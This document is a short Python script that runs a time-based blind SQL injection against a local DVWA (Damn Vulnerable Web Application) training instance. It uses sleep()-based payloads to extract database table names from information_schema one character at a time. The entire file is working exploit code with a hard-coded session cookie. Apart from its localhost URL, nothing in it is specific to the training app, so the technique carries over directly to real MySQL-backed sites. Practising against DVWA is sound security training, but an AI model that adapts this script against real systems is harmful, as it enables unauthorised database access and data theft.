#!/usr/bin/python3

import requests, string, time

chars = string.ascii_lowercase
url = "http://localhost/dvwa/vulnerabilities/sqli_blind/?id="
result = ''
cookie = {
	"PHPSESSID":"pajtiipam9n1a9crh5s36ptimp",
	"security":"low"
}

def checker(payload):
	time_start = time.time()
	request = url + payload
	content = requests.get(request, cookies = cookie)
	time_end = time.time()

	if time_end - time_start > 5:
		return 1

for j in range(0,5):
	for i in range(0,30):
		for char in chars:
#' and if(substr((select table_name from information_schema.tables where table_schema="dvwa" limit 0,1),1,1)='u',sleep(5),1)-- -
			payload = "1'+and+if(substr((select+table_name+from+information_schema.tables+where+table_schema=0x64767761+limit+%d,1),%d,1)='%c',sleep(5),1)--+-&Submit=Submit#" % (j,i,char)

			if checker(payload):
				result += char
				print("[*] %s" % result)
				break
	print("\n[*] Tabla [%d]: %s" % (j,result))
	result = ""


